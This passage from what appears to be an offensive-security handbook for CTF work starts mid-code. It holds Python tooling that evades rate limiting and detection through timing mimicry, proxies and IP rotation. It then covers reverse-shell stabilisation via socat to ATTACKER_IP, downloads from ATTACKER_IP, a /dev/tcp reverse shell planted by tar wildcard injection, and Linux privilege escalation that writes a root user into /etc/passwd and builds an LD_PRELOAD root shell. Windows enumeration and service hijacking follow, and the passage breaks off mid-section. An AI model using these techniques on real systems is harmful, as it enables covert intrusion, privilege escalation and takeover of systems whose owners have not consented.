    def calculate_entropy(self, values, bins=10):
        """Calculate Shannon entropy of timing values"""
        if len(values) < 2:
            return 0
        
        # Discretize values into bins
        hist, _ = np.histogram(values, bins=bins)
        probabilities = hist / len(values)
        probabilities = probabilities[probabilities > 0]  # Remove zeros
        
        entropy = -np.sum(probabilities * np.log2(probabilities))
        return entropy
    
    def generate_high_entropy_delay(self):
        """Generate delay that maintains high entropy in history"""
        
        if len(self.history) < 10:
            # Not enough history, use random
            delay = random.uniform(self.min_delay, self.max_delay)
        else:
            # Check current entropy
            current_entropy = self.calculate_entropy(self.history[-50:])
            
            # Target entropy (closer to max entropy for uniform distribution)
            target_entropy = math.log2(10)  # Max for 10 bins
            
            if current_entropy < target_entropy * 0.8:
                # Low entropy, need more variety
                # Choose from underrepresented ranges
                hist, edges = np.histogram(self.history[-50:], bins=10)
                min_bin = np.argmin(hist)
                delay = random.uniform(edges[min_bin], edges[min_bin + 1])
            else:
                # Good entropy, continue normal distribution
                delay = random.uniform(self.min_delay, self.max_delay)
        
        self.history.append(delay)
        return delay
    
    def make_request_with_entropy(self, url):
        """Make request with high-entropy timing"""
        
        if self.history:
            delay = self.generate_high_entropy_delay()
            print(f"[*] Delay: {delay:.2f}s (Entropy: {self.calculate_entropy(self.history[-50:]):.2f})")
            time.sleep(delay)
        
        return requests.get(url)

# Usage
entropy_timer = EntropyBasedTiming(min_delay=1.0, max_delay=8.0)

for i in range(100):
    response = entropy_timer.make_request_with_entropy('http://target.com/api')
```

**Mimicking Known Legitimate Traffic**

```python
import requests
import time
import json

class TrafficMimicry:
    """
    Learn timing patterns from legitimate traffic and replicate them
    [Inference] Blending perfectly with legitimate traffic is ideal evasion
    """
    
    def __init__(self, training_samples_file=None):
        self.timing_model = []
        if training_samples_file:
            self.load_timing_model(training_samples_file)
    
    def capture_legitimate_timing(self, url, samples=100):
        """
        Capture timing from normal browsing session
        Run this during manual browsing to build profile
        """
        print("[*] Capturing legitimate timing patterns...")
        
        timings = []
        last_time = time.time()
        
        for i in range(samples):
            input(f"[{i+1}/{samples}] Press Enter to record next request...")
            current_time = time.time()
            interval = current_time - last_time
            timings.append(interval)
            last_time = current_time
        
        self.timing_model = timings
        print(f"[+] Captured {len(timings)} timing samples")
        
        return timings
    
    def save_timing_model(self, filename):
        """Save captured timing model"""
        with open(filename, 'w') as f:
            json.dump(self.timing_model, f)
        print(f"[+] Model saved to {filename}")
    
    def load_timing_model(self, filename):
        """Load previously captured timing model"""
        with open(filename, 'r') as f:
            self.timing_model = json.load(f)
        print(f"[+] Loaded {len(self.timing_model)} timing samples")
    
    def sample_timing(self):
        """Sample from learned timing distribution"""
        if not self.timing_model:
            return random.uniform(1.0, 5.0)
        
        # Randomly select from captured samples
        base_timing = random.choice(self.timing_model)
        
        # Add slight variation (±10%)
        variation = base_timing * random.uniform(-0.1, 0.1)
        
        return max(0.1, base_timing + variation)
    
    def make_request_mimicking_legitimate(self, url):
        """Make request with timing matching legitimate traffic"""
        
        delay = self.sample_timing()
        print(f"[*] Mimicking legitimate delay: {delay:.2f}s")
        time.sleep(delay)
        
        return requests.get(url)

# Usage:
# Step 1: Capture legitimate timing during normal browsing
# mimicry = TrafficMimicry()
# mimicry.capture_legitimate_timing('http://target.com', samples=50)
# mimicry.save_timing_model('legitimate_timing.json')

# Step 2: Use captured model for automated requests
mimicry = TrafficMimicry('legitimate_timing.json')
for i in range(100):
    response = mimicry.make_request_mimicking_legitimate('http://target.com/api')
```

### Protocol-Level Timing

**TCP Connection Timing**

```python
import socket
import time
import random

class TCPTimingController:
    """
    Control TCP-level timing characteristics
    [Inference] Connection establishment timing can reveal automation
    """
    
    def __init__(self, target_host, target_port):
        self.host = target_host
        self.port = target_port
    
    def slow_connection_establishment(self):
        """
        Establish TCP connection with realistic timing
        [Inference] Bots often connect instantly, humans have delay
        """
        
        # Simulate DNS lookup delay
        print("[*] Simulating DNS lookup...")
        time.sleep(random.uniform(0.05, 0.2))
        
        # Create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        # Simulate "thinking time" before connection
        time.sleep(random.uniform(0.1, 0.5))
        
        print(f"[*] Connecting to {self.host}:{self.port}")
        start_time = time.time()
        
        try:
            sock.connect((self.host, self.port))
            connect_time = time.time() - start_time
            print(f"[+] Connected in {connect_time:.3f}s")
            return sock
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return None
    
    def send_with_pacing(self, sock, data, chunk_size=64):
        """
        Send data with realistic pacing
        [Inference] Humans don't send data at maximum rate
        """
        
        total_sent = 0
        
        while total_sent < len(data):
            chunk = data[total_sent:total_sent + chunk_size]
            sock.send(chunk)
            total_sent += len(chunk)
            
            # Inter-chunk delay
            if total_sent < len(data):
                time.sleep(random.uniform(0.001, 0.01))
        
        return total_sent

# Usage
tcp_timer = TCPTimingController('target.com', 80)
sock = tcp_timer.slow_connection_establishment()

if sock:
    http_request = b"GET /api/data HTTP/1.1\r\nHost: target.com\r\n\r\n"
    tcp_timer.send_with_pacing(sock, http_request)
    
    response = sock.recv(4096)
    sock.close()
```

**TLS Handshake Timing**

```python
import ssl
import socket
import time
import random

class TLSTimingController:
    """
    Control TLS handshake timing characteristics
    [Inference] TLS handshake timing can fingerprint clients
    """
    
    def __init__(self, target_host, target_port=443):
        self.host = target_host
        self.port = target_port
    
    def establish_tls_with_timing(self):
        """Establish TLS connection with natural timing"""
        
        # Create base socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        # Connect TCP
        print(f"[*] TCP handshake to {self.host}:{self.port}")
        sock.connect((self.host, self.port))
        
        # Pause before TLS handshake (realistic client behavior)
        time.sleep(random.uniform(0.01, 0.05))
        
        # Wrap with TLS
        context = ssl.create_default_context()
        
        print("[*] Starting TLS handshake...")
        start_time = time.time()
        
        try:
            tls_sock = context.wrap_socket(sock, server_hostname=self.host)
            handshake_time = time.time() - start_time
            
            print(f"[+] TLS handshake completed in {handshake_time:.3f}s")
            print(f"[+] Cipher: {tls_sock.cipher()}")
            
            return tls_sock
        except Exception as e:
            print(f"[!] TLS handshake failed: {e}")
            return None

# Usage
tls_timer = TLSTimingController('target.com', 443)
tls_sock = tls_timer.establish_tls_with_timing()

if tls_sock:
    # Send HTTPS request
    request = b"GET /api/data HTTP/1.1\r\nHost: target.com\r\n\r\n"
    tls_sock.send(request)
    
    response = tls_sock.recv(4096)
    tls_sock.close()
```

### Multi-Vector Timing Coordination

**Comprehensive Timing Framework**

```python
import time
import random
import numpy as np
from datetime import datetime, timedelta
import pytz
import requests
from typing import List, Dict, Callable

class MasterTimingCoordinator:
    """
    Comprehensive timing coordination across all vectors
    [Inference] Best evasion combines multiple timing techniques
    """
    
    def __init__(self, config: Dict):
        """
        config = {
            'timezone': 'America/New_York',
            'business_hours': (9, 17),
            'request_distribution': 'pareto',
            'session_duration': 1800,
            'break_duration': 3600,
            'max_requests_per_session': 50,
            'enable_entropy_check': True,
            'enable_pattern_detection': True
        }
        """
        self.config = config
        self.timezone = pytz.timezone(config['timezone'])
        
        # State tracking
        self.session_start = None
        self.session_requests = 0
        self.total_requests = 0
        self.request_history = []
        self.timing_history = []
        
        # Detection flags
        self.pattern_detected = False
        self.rate_limit_hit = False
    
    def is_operational_window(self) -> bool:
        """Check if within operational time window"""
        current_time = datetime.now(self.timezone)
        
        # Weekend check
        if current_time.weekday() >= 5:
            return False
        
        # Business hours check
        start_hour, end_hour = self.config['business_hours']
        current_hour = current_time.hour
        
        return start_hour <= current_hour < end_hour
    
    def should_start_new_session(self) -> bool:
        """Determine if new session should begin"""
        if not self.session_start:
            return True
        
        session_duration = time.time() - self.session_start
        max_duration = self.config['session_duration']
        max_requests = self.config['max_requests_per_session']
        
        # End session if duration or request count exceeded
        return (session_duration > max_duration or 
                self.session_requests >= max_requests)
    
    def take_session_break(self):
        """Take break between sessions"""
        break_duration = np.random.normal(
            self.config['break_duration'],
            self.config['break_duration'] * 0.3
        )
        break_duration = max(300, break_duration)  # Minimum 5 minutes
        
        print(f"[*] Session break for {break_duration/60:.1f} minutes...")
        time.sleep(break_duration)
        
        # Reset session state
        self.session_start = time.time()
        self.session_requests = 0
    
    def calculate_next_delay(self) -> float:
        """Calculate next request delay using configured distribution"""
        
        distribution = self.config['request_distribution']
        
        if distribution == 'pareto':
            delay = (np.random.pareto(2.0) + 1) * 1.5
        elif distribution == 'exponential':
            delay = np.random.exponential(2.0)
        elif distribution == 'gaussian':
            delay = max(0.5, np.random.normal(3.0, 1.0))
        elif distribution == 'uniform':
            delay = random.uniform(1.0, 5.0)
        else:
            delay = 2.0
        
        # Apply time-of-day multiplier
        current_hour = datetime.now(self.timezone).hour
        if 12 <= current_hour < 14:  # Lunch - busier
            delay *= 0.8
        elif 9 <= current_hour < 10:  # Morning start - slower
            delay *= 1.2
        
        # Add jitter
        jitter = delay * random.uniform(-0.2, 0.2)
        final_delay = max(0.5, delay + jitter)
        
        return final_delay
    
    def check_timing_entropy(self) -> float:
        """Check entropy of recent timing patterns"""
        if len(self.timing_history) < 20:
            return 1.0  # Insufficient data
        
        recent_timings = self.timing_history[-50:]
        hist, _ = np.histogram(recent_timings, bins=10)
        probabilities = hist / len(recent_timings)
        probabilities = probabilities[probabilities > 0]
        
        entropy = -np.sum(probabilities * np.log2(probabilities + 1e-10))
        max_entropy = np.log2(10)
        
        return entropy / max_entropy  # Normalized 0-1
    
    def detect_pattern_anomaly(self) -> bool:
        """
        Detect if request pattern might trigger detection
        [Inference] Self-monitoring to adjust behavior
        """
        if len(self.timing_history) < 10:
            return False
        
        recent = self.timing_history[-10:]
        
        # Check for too-consistent timing (robotic)
        std_dev = np.std(recent)
        if std_dev < 0.1:  # Very consistent
            print("[!] Warning: Low timing variance detected")
            return True
        
        # Check for perfectly regular intervals
        intervals = np.diff(recent)
        if len(set(np.round(intervals, 1))) == 1:
            print("[!] Warning: Regular interval pattern detected")
            return True
        
        return False
    
    def execute_request(self, func: Callable, *args, **kwargs):
        """
        Execute request with comprehensive timing coordination
        
        func: Function to execute (e.g., requests.get)
        """
        
        # Check operational window
        while not self.is_operational_window():
            print("[*] Outside operational window. Sleeping 5 minutes...")
            time.sleep(300)
        
        # Session management
        if self.should_start_new_session():
            if self.session_start:  # Not first session
                self.take_session_break()
            else:
                self.session_start = time.time()
        
        # Calculate delay
        delay = self.calculate_next_delay()
        
        # Check for pattern anomalies
        if self.config.get('enable_pattern_detection'):
            if self.detect_pattern_anomaly():
                # Add extra randomness to break pattern
                delay += random.uniform(2, 10)
                print(f"[*] Pattern detected - adding extra delay")
        
        # Check entropy
        if self.config.get('enable_entropy_check'):
            entropy = self.check_timing_entropy()
            if entropy < 0.5:  # Low entropy
                print(f"[!] Low timing entropy ({entropy:.2f}) - increasing variation")
                delay *= random.uniform(0.5, 2.0)
        
        # Apply delay
        print(f"[*] Request #{self.total_requests + 1} - Delay: {delay:.2f}s")
        time.sleep(delay)
        
        # Execute request
        start_time = time.time()
        try:
            result = func(*args, **kwargs)
            request_duration = time.time() - start_time
            
            # Check for rate limiting
            if hasattr(result, 'status_code'):
                if result.status_code == 429:
                    print("[!] Rate limit detected!")
                    self.rate_limit_hit = True
                    # Exponential backoff
                    backoff = 2 ** min(self.session_requests // 10, 6)
                    print(f"[*] Backing off {backoff * 60} seconds...")
                    time.sleep(backoff * 60)
            
            # Update state
            self.session_requests += 1
            self.total_requests += 1
            self.request_history.append(time.time())
            self.timing_history.append(delay)
            
            # Simulate post-request interaction time
            if hasattr(result, 'content'):
                content_length = len(result.content)
                read_time = (content_length / 5000) * random.uniform(0.5, 1.5)
                read_time = min(read_time, 8.0)  # Cap at 8 seconds
                time.sleep(read_time)
            
            return result
            
        except Exception as e:
            print(f"[!] Request failed: {e}")
            self.timing_history.append(delay)
            return None
    
    def execute_campaign(self, 
                        targets: List[str], 
                        max_requests: int = 1000,
                        request_func: Callable = None):
        """
        Execute full campaign with comprehensive timing
        
        targets: List of URLs to target
        max_requests: Maximum total requests
        request_func: Custom request function (default: requests.get)
        """
        
        if request_func is None:
            request_func = requests.get
        
        completed = 0
        
        print(f"[*] Starting campaign: {max_requests} requests across {len(targets)} targets")
        print(f"[*] Timezone: {self.config['timezone']}")
        print(f"[*] Business hours: {self.config['business_hours']}")
        
        while completed < max_requests:
            # Select random target
            target = random.choice(targets)
            
            # Execute with timing coordination
            result = self.execute_request(request_func, target)
            
            if result:
                completed += 1
                
                # Progress update
                if completed % 10 == 0:
                    entropy = self.check_timing_entropy()
                    print(f"\n[+] Progress: {completed}/{max_requests}")
                    print(f"[+] Session requests: {self.session_requests}")
                    print(f"[+] Timing entropy: {entropy:.2f}\n")
        
        print(f"\n[+] Campaign completed: {completed} successful requests")
        print(f"[+] Total sessions: {self.total_requests // self.config['max_requests_per_session']}")
        print(f"[+] Rate limits hit: {self.rate_limit_hit}")

# Usage Example
config = {
    'timezone': 'America/New_York',
    'business_hours': (9, 17),
    'request_distribution': 'pareto',
    'session_duration': 1800,  # 30 minutes
    'break_duration': 3600,    # 1 hour
    'max_requests_per_session': 50,
    'enable_entropy_check': True,
    'enable_pattern_detection': True
}

coordinator = MasterTimingCoordinator(config)

targets = [
    'http://target.com/page1',
    'http://target.com/page2',
    'http://target.com/api/data',
    'http://target.com/vulnerable-endpoint'  # Target with exploit
]

# Execute campaign
coordinator.execute_campaign(targets, max_requests=500)
```

### Timing Attack Checklist

**Pre-Campaign Validation**

```
[ ] Timezone configured to match target geographic location
[ ] Business hours identified (avoid off-hours activity)
[ ] Rate limits identified (manual testing)
[ ] Legitimate traffic patterns studied (timing distribution)
[ ] Session durations realistic (20-45 minutes typical)
[ ] Break periods planned (human-like behavior)
[ ] Request distribution selected (Pareto recommended)
[ ] Entropy monitoring enabled
[ ] Pattern detection enabled
[ ] Jitter configured (±20% minimum)
```

**During Campaign Monitoring**

```
[ ] Monitor rate limit responses (429, 503 status codes)
[ ] Check timing entropy (> 0.7 target)
[ ] Verify no fixed-interval patterns
[ ] Confirm operations within business hours
[ ] Track session durations (realistic lengths)
[ ] Monitor success rate (not 100% - include failures)
[ ] Check response times (consistent with legitimate users)
[ ] Verify no statistical anomalies in logs
```

**Post-Campaign Analysis**

```
[ ] Review timing distribution (should match planned distribution)
[ ] Analyze entropy scores (consistently high)
[ ] Check for detected patterns (none)
[ ] Verify rate limit compliance (no violations)
[ ] Confirm geographic consistency (timezone alignment)
[ ] Review session characteristics (realistic breaks)
[ ] Assess overall detection probability (low)
```

---

## Detection Probability Calculator

```python
import numpy as np
from typing import Dict, List

class DetectionProbabilityCalculator:
    """
    Estimate detection probability based on evasion techniques used
    [Inference] Quantitative assessment of evasion effectiveness
    """
    
    def __init__(self):
        # Scoring weights (0-1, lower is better)
        self.baseline_score = 0.8  # No evasion
    
    def calculate_detection_score(self, evasion_config: Dict) -> Dict:
        """
        Calculate detection probability score
        
        Returns: Dictionary with overall score and breakdown
        """
        
        score = self.baseline_score
        breakdown = {}
        
        # Timing factors
        if evasion_config.get('uses_jitter'):
            reduction = 0.15
            score -= reduction
            breakdown['jitter'] = -reduction
        
        if evasion_config.get('timing_distribution') in ['pareto', 'exponential']:
            reduction = 0.20
            score -= reduction
            breakdown['timing_distribution'] = -reduction
        elif evasion_config.get('timing_distribution') == 'uniform':
            reduction = 0.10
            score -= reduction
            breakdown['timing_distribution'] = -reduction
        
        if evasion_config.get('session_management'):
            reduction = 0.15
            score -= reduction
            breakdown['session_management'] = -reduction
        
        if evasion_config.get('business_hours_only'):
            reduction = 0.10
            score -= reduction
            breakdown['business_hours'] = -reduction
        
        # Network factors
        if evasion_config.get('proxy_type') == 'residential':
            reduction = 0.25
            score -= reduction
            breakdown['residential_proxy'] = -reduction
        elif evasion_config.get('proxy_type') == 'datacenter':
            increase = 0.15
            score += increase
            breakdown['datacenter_proxy'] = increase
        
        if evasion_config.get('uses_vpn'):
            increase = 0.10
            score += increase
            breakdown['vpn_detection'] = increase
        
        if evasion_config.get('rotating_ips'):
            reduction = 0.15
            score -= reduction
            breakdown['ip_rotation'] = -reduction
        
        # Browser fingerprinting
        if evasion_config.get('webrtc_disabled'):
            reduction = 0.08
            score -= reduction
            breakdown['webrtc_protection'] = -reduction
        
        if evasion_config.get('canvas_fingerprint_randomized'):
            reduction = 0.05
            score -= reduction
            breakdown['canvas_protection'] = -reduction
        
        # Behavioral factors
        if evasion_config.get('human_like_interaction'):
            reduction = 0.20
            score -= reduction
            breakdown['human_simulation'] = -reduction
        
        if evasion_config.get('entropy_monitoring'):
            reduction = 0.10
            score -= reduction
            breakdown['entropy_monitoring'] = -reduction
        
        # Ensure score stays in valid range
        score = max(0.0, min(1.0, score))
        
        return {
            'detection_probability': score,
            'breakdown': breakdown,
            'risk_level': self._get_risk_level(score)
        }
    
    def _get_risk_level(self, score: float) -> str:
        """Convert score to risk level"""
        if score < 0.2:
            return "Very Low"
        elif score < 0.4:
            return "Low"
        elif score < 0.6:
            return "Medium"
        elif score < 0.8:
            return "High"
        else:
            return "Very High"

# Usage Example
calculator = DetectionProbabilityCalculator()

# Minimal evasion
minimal_config = {
    'uses_jitter': False,
    'timing_distribution': 'fixed',
    'session_management': False,
    'business_hours_only': False,
    'proxy_type': 'datacenter',
    'rotating_ips': False,
    'webrtc_disabled': False,
    'human_like_interaction': False
}

result = calculator.calculate_detection_score(minimal_config)
print("Minimal Evasion:")
print(f"Detection Probability: {result['detection_probability']:.2%}")
print(f"Risk Level: {result['risk_level']}\n")

# Comprehensive evasion
comprehensive_config = {
    'uses_jitter': True,
    'timing_distribution': 'pareto',
    'session_management': True,
    'business_hours_only': True,
    'proxy_type': 'residential',
    'rotating_ips': True,
    'webrtc_disabled': True,
    'canvas_fingerprint_randomized': True,
    'human_like_interaction': True,
    'entropy_monitoring': True
}

result = calculator.calculate_detection_score(comprehensive_config)
print("Comprehensive Evasion:")
print(f"Detection Probability: {result['detection_probability']:.2%}")
print(f"Risk Level: {result['risk_level']}")
print("\nBreakdown:")
for factor, impact in result['breakdown'].items():
    print(f"  {factor}: {impact:+.2f}")
```

---

## Final Recommendations

### Optimal Evasion Stack for CTF Scenarios

**Priority 1: Timing (Critical)**

- Use Pareto distribution for request intervals
- Add 20-30% jitter to all delays
- Implement session management (30-45 min sessions)
- Operate during business hours only
- Monitor timing entropy continuously

**Priority 2: Network Anonymization (High)**

- Residential proxies > Mobile proxies > VPN > Datacenter proxies
- Rotate IPs regularly (every 50-100 requests)
- Disable WebRTC in browser automation
- Use encrypted DNS (DoH/DoT)
- Match timezone/locale to proxy location

**Priority 3: Behavioral Realism (Medium)**

- Simulate reading time based on content length
- Add scroll pauses and interaction delays
- Include occasional failed requests (realistic)
- Follow realistic navigation paths
- Maintain consistent session characteristics

**Priority 4: Technical Obfuscation (Low for CTF, varies by target)**

- Payload encoding (context-specific)
- Header sanitization
- Protocol-level obfuscation (if DPI present)

[Inference] In CTF environments, timing and behavioral factors are often more important than technical obfuscation, as the goal is typically to avoid automated rate limiting rather than sophisticated DPI/ML detection systems.

---

# Post-Exploitation & Persistence

## Reverse Shell Stabilization

### Python TTY Upgrade

bash

```bash
# Method 1: Python PTY
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Background the shell
Ctrl+Z

# Configure terminal
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
```

### Fully Interactive Shell Technique

bash

```bash
# Step 1: Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2: Background (Ctrl+Z), then:
stty raw -echo; fg

# Step 3: Reset and configure
reset
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 38 columns 116  # Match your terminal size
```

**Check terminal dimensions on attacker machine:**

bash

```bash
stty -a | head -n1 | cut -d ';' -f 2-3
```

### Alternative Stabilization Methods

**Using script:**

bash

```bash
script /dev/null -c bash
```

**Using socat (if available on target):**

bash

```bash
# On attacker (listener):
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

**Using expect:**

bash

```bash
expect -c 'spawn /bin/bash; interact'
```

### Shell Environment Configuration

bash

```bash
# Set PATH
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Enable command history
export HISTFILE=/tmp/.bash_history

# Disable terminal echo (stealth)
stty -echo
```

---

## Privilege Escalation from Shell

### Linux Privilege Escalation

#### Enumeration Scripts

bash

```bash
# LinPEAS (Linux Privilege Escalation Awesome Script)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Alternative download methods
wget http://ATTACKER_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > /tmp/linpeas_output.txt

# LinEnum
wget http://ATTACKER_IP/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t

# Linux Smart Enumeration (LSE)
wget http://ATTACKER_IP/lse.sh
chmod +x lse.sh
./lse.sh -l 1  # Level 1 (faster)
./lse.sh -l 2  # Level 2 (deeper)
```

#### Manual Enumeration

**System Information:**

bash

```bash
# OS and kernel
uname -a
cat /etc/issue
cat /etc/*-release
lsb_release -a

# Environment variables
env
cat /etc/profile
cat /etc/bashrc
cat ~/.bashrc

# Running processes
ps aux
ps -ef
top -n 1
```

**User and Group Information:**

bash

```bash
# Current user
id
whoami

# All users
cat /etc/passwd
cat /etc/passwd | cut -d: -f1  # Just usernames
getent passwd

# Group memberships
groups
cat /etc/group
getent group

# Sudoers
sudo -l  # Check sudo permissions
cat /etc/sudoers 2>/dev/null

# User command history
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
find / -type f -name ".*_history" 2>/dev/null
```

**SUID/SGID Files:**

bash

```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Combined SUID/SGID
find / -perm -6000 -type f 2>/dev/null

# Writable SUID binaries
find / -perm -u=s -type f -writable 2>/dev/null
```

**Capabilities:**

bash

```bash
# List files with capabilities
getcap -r / 2>/dev/null

# Common exploitable capabilities:
# cap_setuid - allows setting UID
# cap_dac_override - bypass file read/write/execute checks
# cap_dac_read_search - bypass file read checks
```

**Writable Files and Directories:**

bash

```bash
# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc
find / -perm -2 -type f 2>/dev/null

# World-writable directories
find / -writable -type d 2>/dev/null
find / -perm -2 -type d 2>/dev/null

# Files owned by current user
find / -user $(whoami) 2>/dev/null
find / -group $(id -gn) 2>/dev/null
```

**Cron Jobs:**

bash

```bash
# System cron
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/*

# User cron
crontab -l
crontab -l -u username

# Check for writable cron jobs
find /etc/cron* -type f -writable 2>/dev/null
```

**Network Services:**

bash

```bash
# Listening ports
netstat -tulpn
ss -tulpn
lsof -i

# Active connections
netstat -antp
ss -antp

# Network configuration
ifconfig
ip a
ip route
cat /etc/hosts
cat /etc/resolv.conf
```

#### Common Privilege Escalation Vectors

**Sudo Exploitation:**

bash

```bash
# Check sudo permissions
sudo -l

# GTFOBins sudo exploits (examples)
# If sudo vim allowed:
sudo vim -c ':!/bin/bash'

# If sudo find allowed:
sudo find . -exec /bin/bash \; -quit

# If sudo awk allowed:
sudo awk 'BEGIN {system("/bin/bash")}'

# If sudo python allowed:
sudo python -c 'import os; os.system("/bin/bash")'

# Environment variable preservation
sudo LD_PRELOAD=/path/to/malicious.so program
```

**SUID Binary Exploitation:**

[Inference: These are common SUID exploitation patterns, but specific vulnerability depends on binary implementation]

bash

```bash
# Using GTFOBins methodology

# If /usr/bin/find is SUID:
/usr/bin/find . -exec /bin/bash -p \; -quit

# If /usr/bin/vim is SUID:
/usr/bin/vim -c ':py import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'

# If /usr/bin/nano is SUID:
/usr/bin/nano
# Then Ctrl+R, Ctrl+X, type: reset; bash -p

# If /usr/bin/cp is SUID (overwrite /etc/passwd):
echo 'hacker:$1$hacker$TzyKlv0IgKIgCVIbqGlYw/:0:0:root:/root:/bin/bash' > /tmp/passwd
/usr/bin/cp /tmp/passwd /etc/passwd
su hacker  # Password: hacker

# Custom SUID exploitation
strings /path/to/suid_binary  # Check for relative paths
ltrace /path/to/suid_binary   # Trace library calls
```

**Capabilities Exploitation:**

bash

```bash
# Python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# tar with cap_dac_read_search (read any file)
tar -cvf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

**Kernel Exploits:**

[Inference: Kernel versions determine applicable exploits]

bash

```bash
# Identify kernel version
uname -r
uname -a

# Search for exploits
searchsploit linux kernel $(uname -r)
searchsploit privilege escalation linux

# Common kernel exploits (examples):
# Dirty COW (CVE-2016-5195) - Kernel 2.6.22 < 3.9
# Dirty Pipe (CVE-2022-0847) - Kernel 5.8 - 5.16.11
# PwnKit (CVE-2021-4034) - pkexec vulnerability

# Compile and transfer exploit
gcc -o exploit exploit.c
# Transfer via wget, curl, nc, etc.
./exploit
```

**NFS Root Squashing:**

bash

```bash
# On target, check NFS shares
cat /etc/exports
showmount -e localhost

# If no_root_squash is set:
# On attacker machine:
mkdir /tmp/nfs
mount -t nfs TARGET_IP:/share /tmp/nfs
cd /tmp/nfs

# Create SUID binary
cp /bin/bash .
chmod +s bash

# On target:
/share/bash -p
```

**Path Hijacking:**

bash

```bash
# Check PATH
echo $PATH

# If script runs with elevated privileges and uses relative paths:
# Create malicious binary
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls

# Prepend PATH
export PATH=/tmp:$PATH

# Execute vulnerable script
```

**LD_PRELOAD Exploitation:**

bash

```bash
# Check if LD_PRELOAD is preserved
sudo -l
# Look for: env_keep+=LD_PRELOAD

# Create malicious library
cat > /tmp/preload.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <allowed_program>
```

**Wildcard Injection:**

bash

```bash
# If root cron runs: tar czf backup.tar.gz *
# In directory:
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
chmod +x shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# When tar runs, it interprets filenames as arguments
```

### Windows Privilege Escalation

#### Enumeration

**System Information:**

cmd

```cmd
systeminfo
wmic qfe list
hostname
ver

:: Check architecture
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%
```

**User Information:**

cmd

```cmd
whoami
whoami /priv
whoami /groups
net user
net user <username>
net localgroup
net localgroup administrators
```

**PowerShell Enumeration:**

powershell

```powershell
# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# JAWS (Just Another Windows Enum Script)
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1

# Sherlock (patched vulnerabilities)
. .\Sherlock.ps1
Find-AllVulns

# WinPEAS
.\winPEASany.exe
.\winPEASx64.exe
```

**Services:**

cmd

```cmd
:: List services
sc query
wmic service list brief
net start

:: Service permissions
sc qc <service_name>
sc sdshow <service_name>

:: Unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

**Scheduled Tasks:**

cmd

```cmd
schtasks /query /fo LIST /v
type C:\Windows\System32\Tasks\<task_name>

:: Check task permissions
icacls C:\Windows\System32\Tasks\<task_name>
```

**Registry AutoRuns:**

cmd

```cmd
:: Check registry autoruns
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

:: AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**File System:**

cmd

```cmd
:: World-writable folders
icacls "C:\Program Files"
icacls "C:\Program Files (x86)"

:: Search for passwords
findstr /si password *.txt *.xml *.ini
dir /s *pass* == *cred* == *vnc* == *.config*

:: Unattended installation files
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

**Network:**

cmd

```cmd
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall show allprofiles
```

#### Windows Exploitation Vectors

**Service Exploits:**

cmd

```cmd
:: Unquoted service path
:: If service path is: C:\Program Files\Vulnerable Service\service.exe
:: And directory is writable, create:
C:\Program.exe or C:\Program Files\Vulnerable.exe

:: Binary replacement
icacls <service_binary>
:: If (F) or (M), replace binary
move <service_binary> <service_binary>.bak
copy payload.exe <service_binary>
sc stop <service>
sc start <service>

:: Service DLL hijacking
:: Check for missing DLLs with Process Monitor
:: Place malicious DLL in writable directory in PATH
```

**AlwaysInstallElevated:**

cmd

```cmd
:: If both registry keys are set to 1:
:: Generate MSI payload
